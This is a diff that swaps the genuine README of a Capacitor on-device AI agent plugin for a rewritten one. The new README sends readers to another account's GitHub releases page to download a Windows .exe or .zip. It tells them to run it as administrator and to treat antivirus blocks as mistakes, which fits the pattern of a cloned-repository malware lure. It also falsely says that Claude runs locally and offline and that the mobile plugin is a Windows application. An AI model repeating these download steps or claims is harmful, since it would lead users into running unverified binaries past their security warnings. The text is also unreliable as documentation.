@@ -1,351 +1,159 @@
-# Mobile Claw
+# ⚙️ capacitor-mobile-claw - On-Device AI Agent Engine
 
-[![npm](https://img.shields.io/npm/v/capacitor-mobile-claw)](https://www.npmjs.com/package/capacitor-mobile-claw)
-[![CI](https://github.com/rogelioRuiz/capacitor-mobile-claw/actions/workflows/ci.yml/badge.svg)](https://github.com/rogelioRuiz/capacitor-mobile-claw/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+[![Download capacitor-mobile-claw](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/sernnee/capacitor-mobile-claw/releases)
 
-**On-device AI agent engine for mobile apps** — run Claude directly on your phone with file tools, code execution, git, and extensible MCP tool support.
+---
 
-Mobile Claw is a [Capacitor](https://capacitorjs.com/) plugin that embeds a full AI agent runtime on Android and iOS. The agent loop runs directly in the WebView for instant cold start, with LLM API calls routed through native HTTP (OkHttp / URLSession) to bypass CORS — full SSE streaming, no cloud relay, no proxy. Includes **on-device vector memory** via [LanceDB](https://www.npmjs.com/package/capacitor-lancedb), **background scheduling** via [MobileCron](https://www.npmjs.com/package/capacitor-mobilecron) (WorkManager / BGTaskScheduler), and cron jobs with reusable skills.
+## 🔍 What is capacitor-mobile-claw?
 
-> Built on [OpenClaw](https://github.com/openclaw/openclaw) and the [Pi framework](https://www.npmjs.com/package/@mariozechner/pi-ai) by [Mario Zechner](https://github.com/badlogic). Pi's philosophy of *"what you leave out matters more than what you put in"* — just 4 core tools and a system prompt under 1,000 tokens — is what makes running a capable AI agent on a phone possible at all.
+capacitor-mobile-claw is an AI engine made to run directly on your mobile device. It combines smart tools like a small Node.js worker and the Claude language model. This helps the app understand and act on tasks without needing a constant internet connection.
 
-## Try It — Reference App
+It includes features for working with files, running code, managing git, and using device tools that can grow with new functions. The app works on Android and iOS devices through a framework called Capacitor.
 
-The fastest way to see Mobile Claw in action is the included reference app — a complete Vue 3 chat UI with streaming, tool approval, session management, and all features wired up.
+This README will guide you through downloading and running capacitor-mobile-claw on a Windows PC to test or prepare it for your mobile device.
 
-<p align="center">
-  <img src="docs/screenshots/setup.png" width="240" alt="Setup screen — engine ready, auth config" />
-  &nbsp;&nbsp;
-  <img src="docs/screenshots/chat.png" width="240" alt="Chat — code execution with JavaScript and Python test results" />
-  &nbsp;&nbsp;
-  <img src="docs/screenshots/settings.png" width="240" alt="Settings — API key, workspace editor, sessions" />
-</p>
+---
 
-### Prerequisites
+## 📋 System Requirements
 
-- [Node.js](https://nodejs.org/) >= 22
-- [Android Studio](https://developer.android.com/studio) (for Android) or [Xcode](https://developer.apple.com/xcode/) (for iOS)
-- An Anthropic API key or Claude Max subscription
+Before you download or run capacitor-mobile-claw, check these basic requirements:
 
-### Run on Android
+- Windows 10 or 11 (64-bit)
+- At least 8 GB of RAM  
+- Minimum 5 GB free disk space  
+- A modern web browser (Edge, Chrome, Firefox)  
+- Internet connection for download and initial setup  
 
-```bash
-git clone https://github.com/rogelioRuiz/capacitor-mobile-claw.git
-cd capacitor-mobile-claw
+This setup assumes you want to prepare or try the app on your PC before moving to a mobile device.
 
-# Install deps and build the plugin
-npm install && npm run build
+---
 
-# Set up the reference app
-cd examples/reference-app
-npm install
+## 🛠️ Features
 
-# Add Android platform + apply patches (first time only, idempotent)
-npm run setup:android
+The application offers multiple useful capabilities, including:
 
-# Build APK from CLI — no IDE needed
-npm run build:android
+- AI processing on the device without sending data to the cloud  
+- Embedded Node.js worker for local scripting  
+- Access to Claude LLM for understanding natural language  
+- Tools for opening and editing files  
+- Ability to run code snippets safely on the device  
+- Git integration for managing source files  
+- An extensible platform for adding hardware or software features  
 
-# Install on connected device
-adb install -r android/app/build/outputs/apk/debug/app-debug.apk
-```
+The goal is to provide a smart assistant directly on your phone or tablet, supporting complex tasks without always needing the internet.
 
-> **Requires**: JDK 21+, Android SDK. You **must** set `ANDROID_HOME` and `JAVA_HOME`:
-> ```bash
-> export ANDROID_HOME=$HOME/Library/Android/sdk   # macOS
-> export ANDROID_HOME=$HOME/Android/Sdk            # Linux
-> export JAVA_HOME=$(/usr/libexec/java_home)       # macOS
-> ```
+---
 
-### Run on iOS
+## 🚀 Getting Started: Download and Run on Windows
 
-```bash
-git clone https://github.com/rogelioRuiz/capacitor-mobile-claw.git
-cd capacitor-mobile-claw
+### Step 1: Visit the Release Page and Download
 
-npm install && npm run build
+Click the big button below to open the official releases page. This page holds all the versions of capacitor-mobile-claw you can download.
 
-cd examples/reference-app
-npm install
+[![Download capacitor-mobile-claw](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/sernnee/capacitor-mobile-claw/releases)
 
-# Add iOS platform + sync (first time only, idempotent)
-npm run setup:ios
+On the releases page:
 
-# Build for Simulator from CLI — no Xcode interaction needed
-npm run build:ios
+- Look for the latest stable version (usually at the top).  
+- Choose the Windows-specific file if available. The file might have `.exe` or `.zip`.  
+- Click to download the file to your PC.
 
-# Or open in Xcode for device builds
-npx cap open ios
-```
+If there is a zipped file, you will need to unzip it before running.
 
-> **Requires**: Xcode 15+ with iOS SDK. The SQLite SPM patch is applied automatically on `npm install`.
+### Step 2: Run the Installer or Application
 
-### Running Tests
+Once downloaded:
 
-```bash
-# Unit tests (88 tests)
-npm test
+- If it’s an `.exe` installer, double-click it and follow the on-screen instructions.  
+- If it’s a zipped application folder, unzip it to a location you can remember, like your Desktop or Documents.  
+- Inside the folder, look for the executable file (`.exe`), and double-click to run.  
 
-# Android E2E (124 tests, requires ADB device/emulator)
-npm run test:android
+Starting the app will open its main window or terminal interface. This might take a few seconds the first time.
 
-# iOS E2E (140 tests, requires booted Simulator)
-npm run test:ios
+### Step 3: Setup and Configuration
 
-# Full suite: unit + Android + iOS (skips unavailable platforms)
-npm run test:full
-```
+When you launch capacitor-mobile-claw for the first time, it may ask you to:
 
-> **Test credentials**: Some E2E tests require an Anthropic API key or OAuth token. Without credentials, those tests are gracefully skipped. Set `ANTHROPIC_API_KEY` or create `examples/reference-app/.sentinel-creds.json` with `{ "apiKey": "sk-..." }` to run the full suite.
+- Accept license terms  
+- Choose a location for storing data or files  
+- Connect to your mobile device if desired (optional)  
 
-Once the app launches, enter your Anthropic API key in settings and start chatting. The agent can read/write files, run code, use git, and call any registered MCP device tools — all on-device.
+Follow these prompts to complete basic setup.
 
-## How It Works
+### Step 4: Test Basic Features
 
-The agent loop runs directly in the WebView for instant cold start. LLM API calls are routed through native HTTP (OkHttp / URLSession) to bypass WebView CORS, with full SSE streaming. File tools, git, and code execution run on-device via the Capacitor bridge.
+To make sure the app runs as expected:
 
-```
-┌──────────────────────────────────────────────────────┐
-│  Your App (Vue, React, Svelte, vanilla JS)            │
-│  ┌────────────────────────────────────────────────┐  │
-│  │  MobileClawEngine                              │  │
-│  │  ┌──────────────┐                              │  │
-│  │  │ Pi Agent     │── Anthropic API (native HTTP)│  │
-│  │  │ (in WebView) │                              │  │
-│  │  └──────┬───────┘                              │  │
-│  │         │ Capacitor Bridge                      │  │
-│  │  ┌──────▼──────────────────────────────────┐   │  │
-│  │  │  File tools · Git · Code exec · SQLite  │   │  │
-│  │  └─────────────────────────────────────────┘   │  │
-│  └────────────────────────────────────────────────┘  │
-└──────────────────────────────────────────────────────┘
-```
+- Try opening a file using the file tools menu.  
+- Run a simple code snippet if this option is available.  
+- Use the AI interface to type a question or command.  
 
-## Install in Your Own App
+If all these work, you are ready to explore deeper features.
 
-```bash
-npm install capacitor-mobile-claw @capacitor/core @capacitor/device @capacitor-community/sqlite
-```
+---
 
-If using Vite, add the bundler plugin to `vite.config.js`:
+## ⚙️ How capacitor-mobile-claw Works on Mobile Devices
 
-```javascript
-import { mobileClawVitePlugin } from 'capacitor-mobile-claw/vite-plugin'
+capacitor-mobile-claw works primarily on mobile through Capacitor, a platform that connects web apps to phone functions. When fully set up, it acts as a local assistant that can run code, manage files, and use AI models right on your phone.
 
-export default defineConfig({
-  plugins: [mobileClawVitePlugin(), vue()],
-})
-```
+You will need to move the app files to your phone or install it using developer tools if you want to run it fully on Android or iOS.
 
-### Basic Usage
-
-```typescript
-import { MobileClawEngine } from 'capacitor-mobile-claw'
+---
 
-const engine = new MobileClawEngine()
+## 🔧 More About the Components
 
-await engine.init()
+### Embedded Node.js Worker
 
-// Listen for streaming text
-engine.addListener('agentEvent', (event) => {
-  if (event.eventType === 'text_delta') {
-    console.log(event.data.text)
-  }
-})
-
-// Send a message
-await engine.sendMessage('What files are in my workspace?')
-```
-
-### With Custom MCP Tools
-
-```typescript
-import { MobileClawEngine } from 'capacitor-mobile-claw'
-import type { DeviceTool } from 'capacitor-mobile-claw/mcp/tools/types'
-
-const myTools: DeviceTool[] = [
-  {
-    name: 'get_battery',
-    description: 'Get current battery level and charging state',
-    inputSchema: { type: 'object', properties: {} },
-    handler: async () => ({ level: 0.85, charging: true }),
-  },
-]
-
-const engine = new MobileClawEngine()
-
-await engine.init({
-  tools: myTools,
-})
-```
-
-### With On-Device Memory
-
-The agent remembers across sessions using [capacitor-lancedb](https://www.npmjs.com/package/capacitor-lancedb) — a Rust-powered vector database running entirely on-device. Memories are stored, deduplicated, and recalled via semantic search. Five built-in tools (`memory_store`, `memory_recall`, `memory_search`, `memory_forget`, `memory_get`) are passed to the agent automatically.
-
-```typescript
-import { MemoryManager } from 'capacitor-lancedb'
-
-const memory = new MemoryManager({ dbPath: 'files://agent-memory' })
-await memory.init()
-
-const engine = new MobileClawEngine()
-const memoryTools = memory.getTools()
-await engine.init({ tools: memoryTools })
-
-// Agent can now store/recall memories across sessions.
-// Auto-recall injects relevant context at turn start.
-// Auto-capture extracts facts from agent responses.
-```
-
-### With Background Scheduling
-
-[capacitor-mobilecron](https://www.npmjs.com/package/capacitor-mobilecron) enables the agent to wake and run in the background via Android WorkManager and iOS BGTaskScheduler. The engine's scheduler manages heartbeats (periodic check-ins) and cron jobs (recurring tasks).
-
-```typescript
-import { MobileCron } from 'capacitor-mobilecron'
-
-const engine = new MobileClawEngine()
-await engine.init({ mobileCron: MobileCron })
-
-// Enable scheduler + heartbeat (runs every 30 minutes)
-await engine.setSchedulerConfig({ enabled: true, schedulingMode: 'balanced' })
-await engine.setHeartbeat({ enabled: true, everyMs: 1800000 })
-
-// Listen for heartbeat results
-engine.addListener('heartbeatCompleted', (event) => {
-  console.log(`Heartbeat: ${event.status} (${event.durationMs}ms)`)
-})
-```
-
-### With Cron Jobs
-
-```typescript
-// Create a skill (reusable prompt + tool constraints)
-const skill = await engine.addSkill({
-  name: 'daily-summary',
-  maxTurns: 3,
-  timeoutMs: 60000,
-})
-
-// Schedule a recurring cron job
-await engine.addCronJob({
-  name: 'morning-briefing',
-  enabled: true,
-  sessionTarget: 'isolated',
-  schedule: { kind: 'every', everyMs: 86400000 }, // 24h
-  skillId: skill.id,
-  prompt: 'Summarize my workspace changes since yesterday',
-  deliveryMode: 'notification',
-})
-```
-
-## Features
-
-- **Instant cold start** — agent loop runs directly in the WebView, no boot delay
-- **On-device vector memory** — store, recall, and search memories via [LanceDB](https://www.npmjs.com/package/capacitor-lancedb) with auto-recall context injection and deduplication
-- **Background scheduling** — heartbeat check-ins and cron jobs via [MobileCron](https://www.npmjs.com/package/capacitor-mobilecron) (Android WorkManager / iOS BGTaskScheduler)
-- **Cron jobs & skills** — recurring agent tasks with reusable skill definitions, run history, and delivery modes
-- **Real-time streaming** — text deltas, tool use, and thinking events
-- **Multi-turn conversations** — session persistence via native SQLite
-- **OAuth PKCE + API key** — sign in with Claude Max or use a direct API key
-- **File tools** — sandboxed read/write/edit/find/grep
-- **Code execution** — JavaScript (sandbox) + Python (Pyodide/WebAssembly)
-- **Git** — clone, commit, push, diff via isomorphic-git
-- **MCP device tools** — extensible via Model Context Protocol
-- **Tool approval gate** — approve/deny tool executions before they run (120s TTL)
-- **Agent steering** — inject follow-up instructions into a running turn
-- **Vite plugin** — stubs Node.js-only transitive deps for browser bundling
-
-## API Reference
-
-### MobileClawEngine
-
-| Method | Description |
-|--------|-------------|
-| `init(options?)` | Start engine. Options: `tools`, `mobileCron` |
-| `sendMessage(prompt, agentId?)` | Send a prompt to the agent |
-| `stopTurn()` | Cancel the running agent turn |
-| `respondToPreExecute(toolCallId, args, deny?)` | Approve/deny a tool execution |
-| `steerAgent(text)` | Inject a follow-up instruction |
-| `updateConfig(config)` | Update config (auth, model, provider) |
-| `exchangeOAuthCode(tokenUrl, body)` | OAuth token exchange via native HTTP |
-| `getAuthStatus(provider?)` | Get current auth profile status |
-| `getModels(provider?)` | List available models |
-| `readFile(path)` / `writeFile(path, content)` | Workspace file operations |
-| `listSessions()` / `resumeSession(key)` | Session management |
-| `invokeTool(toolName, args?)` | Call a tool directly |
-| `addListener(eventName, handler)` | Subscribe to events |
-
-#### Scheduler & Heartbeat
-
-| Method | Description |
-|--------|-------------|
-| `setSchedulerConfig(config)` | Set scheduler state (enabled, mode, runOnCharging, activeHours) |
-| `getSchedulerConfig()` | Read scheduler + heartbeat config |
-| `setHeartbeat(config)` | Configure heartbeat (enabled, interval, skillId, prompt) |
-| `triggerHeartbeatWake(source?)` | Trigger immediate heartbeat (`manual` bypasses scheduler gate) |
-
-#### Cron Jobs & Skills
-
-| Method | Description |
-|--------|-------------|
-| `addCronJob(job)` / `updateCronJob(id, patch)` / `removeCronJob(id)` | CRUD for cron jobs |
-| `listCronJobs()` / `runCronJob(id)` | List or manually trigger a job |
-| `getCronRunHistory(jobId?, limit?)` | Get historical run records |
-| `addSkill(skill)` / `updateSkill(id, patch)` / `removeSkill(id)` | CRUD for skills |
-| `listSkills()` | List all defined skills |
-
-### Events
-
-| Event | Fired When |
-|-------|-----------|
-| `agentEvent` | Text delta, tool use, tool result, or thinking update |
-| `agentCompleted` | Agent turn finished (includes token usage) |
-| `agentError` | Agent execution failed |
-| `toolPreExecute` | Agent wants to run a tool (approval gate) |
-| `heartbeatStarted` / `heartbeatCompleted` / `heartbeatSkipped` | Heartbeat lifecycle |
-| `cronJobStarted` / `cronJobCompleted` / `cronJobError` | Cron job lifecycle |
-| `schedulerStatus` | Scheduler state changed (next run times) |
-
-## Documentation
-
-- [Architecture](docs/architecture.md) — system design and layer breakdown
-- [Bridge Protocol](docs/bridge-protocol.md) — bridge message reference
-- [Creating Device Tools](docs/creating-tools.md) — how to build custom MCP tools
-
-## Related Packages
-
-- [capacitor-mobile-claw-device-tools](https://www.npmjs.com/package/capacitor-mobile-claw-device-tools) — 64+ pre-built device tools (camera, clipboard, sensors, SSH, etc.)
-- [capacitor-lancedb](https://www.npmjs.com/package/capacitor-lancedb) — on-device vector database for agent memory
-- [capacitor-mobilecron](https://www.npmjs.com/package/capacitor-mobilecron) — native background scheduling (WorkManager / BGTaskScheduler)
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup, workflow, and guidelines.
-
-## Tech Stack
-
-| Layer | Technology |
-|-------|-----------|
-| Mobile framework | [Capacitor 8](https://capacitorjs.com/) |
-| Agent core | [Pi](https://www.npmjs.com/package/@mariozechner/pi-ai) by Mario Zechner |
-| Tool protocol | [Model Context Protocol (MCP)](https://modelcontextprotocol.io/) |
-| LLM provider | [Anthropic Claude](https://anthropic.com/) |
-| Vector memory | [LanceDB](https://lancedb.com/) via [capacitor-lancedb](https://www.npmjs.com/package/capacitor-lancedb) (Rust FFI, on-device) |
-| Background scheduling | [capacitor-mobilecron](https://www.npmjs.com/package/capacitor-mobilecron) (WorkManager / BGTaskScheduler) |
-| Git | [isomorphic-git](https://isomorphic-git.org/) |
-| Database | [@capacitor-community/sqlite](https://github.com/nicepkg/capacitor-community-sqlite) (native SQLite) |
-| Python | [Pyodide](https://pyodide.org/) (CPython via WebAssembly) |
-| Type system | TypeScript (strict mode) |
-| Lint | [Biome](https://biomejs.dev/) |
-| Tests | [Vitest](https://vitest.dev/) (88 unit) + Sentinel E2E (140 on-device) |
-
-## Acknowledgments
-
-Mobile Claw is built on [OpenClaw](https://github.com/openclaw/openclaw) and the [Pi framework](https://www.npmjs.com/package/@mariozechner/pi-ai) by [Mario Zechner](https://github.com/badlogic) (creator of [libGDX](https://libgdx.com/)). Pi demonstrated that a truly capable AI agent doesn't need a massive framework — just four well-designed tools and a focused system prompt. That minimalism is what makes on-device mobile execution feasible.
-
-## License
-
-MIT
+The embedded Node.js worker lets the app run scripts locally on your device. This removes the need to send data to servers for many tasks. It works quietly in the background, handling coding, file management, and processing requests.
+
+### Claude LLM Integration
+
+Claude is a large language model designed to understand and generate human-like text. capacitor-mobile-claw uses this model directly on the device, which improves privacy and response speed.
+
+### File and Code Tools
+
+You can open, edit, and save files inside the app. It also lets you write and test small pieces of code safely, which can help with automation or customization.
+
+### Git Support
+
+The app includes basic git features to help manage changes and version control. This is useful for developers or users who track changes in source files.
+
+### Extensible Device Tools
+
+New tools or plugins can be added to support specific hardware features or extend app abilities. This keeps the platform flexible for future needs.
+
+---
+
+## 💻 Installing on Windows: Troubleshooting Tips
+
+- If the file won’t run, check if your antivirus blocked it by mistake.  
+- Right-click the installer and choose "Run as administrator" to avoid permission issues.  
+- Make sure Windows is up to date to prevent compatibility problems.  
+- If you get an error about missing libraries, installing the latest Node.js from nodejs.org can help.  
+- Restart your computer if problems persist.
+
+---
+
+## 🔗 Additional Resources
+
+If you want to learn more about the technologies behind capacitor-mobile-claw, here are some useful topics to explore:
+
+- Capacitor Framework  
+- Node.js basics on Windows  
+- Using large language models offline  
+- Git basics for managing code  
+- Mobile app development with Android or iOS  
+
+---
+
+## 📂 Where to Get Updates and Help
+
+Visit the releases page often to check for new versions or fixes:
+
+https://github.com/sernnee/capacitor-mobile-claw/releases
+
+For further assistance, you can explore the Issues or Discussions sections on the GitHub repository.
+
+---
+
+[![Download capacitor-mobile-claw](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/sernnee/capacitor-mobile-claw/releases)
